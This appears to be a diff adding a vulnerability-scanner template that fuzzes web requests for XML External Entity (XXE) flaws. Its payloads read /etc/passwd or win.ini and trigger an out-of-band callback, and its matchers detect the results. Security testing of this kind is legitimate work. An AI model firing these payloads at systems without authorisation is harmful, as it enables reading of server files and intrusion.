@@ -1,0 +1,47 @@
+http:
+- fuzzing:
+  - fuzz:
+    - '{{xxe}}'
+    mode: single
+    part: request
+    type: replace
+  matchers:
+  - name: linux
+    part: body
+    regex:
+    - 'root:.*?:[0-9]*:[0-9]*:'
+    type: regex
+  - name: windows
+    part: body
+    type: word
+    words:
+    - for 16-bit app support
+  - part: interactsh_protocol
+    type: word
+    words:
+    - http
+  matchers-condition: or
+  payloads:
+    xxe:
+    - <!DOCTYPE {{rletter}} [ <!ENTITY {{rletter}} SYSTEM "file:///c:/windows/win.ini">
+      ]><x>&{{rletter}};</x>
+    - <!DOCTYPE {{rletter}} [ <!ENTITY {{rletter}} SYSTEM "file:////etc/passwd"> ]><x>&{{rletter}};</x>
+    - <!DOCTYPE {{rletter}} [ <!ENTITY {{rletter}} SYSTEM "http://{{interactsh-url}}">
+      ]><x>&{{rletter}};</x>
+  pre-condition:
+  - condition: and
+    dsl:
+    - method != "OPTIONS"
+    - '!contains(path, ".js")'
+    type: dsl
+  stop-at-first-match: true
+id: xxe-detection
+info:
+  author: pwnhxl,AmirHossein Raeisi
+  name: Generic XML External Entity - (XXE)
+  reference:
+  - https://github.com/andresriancho/w3af/blob/master/w3af/plugins/audit/xxe.py
+  severity: medium
+  tags: xxe,dast,full
+variables:
+  rletter: '{{rand_base(6,''abc'')}}'
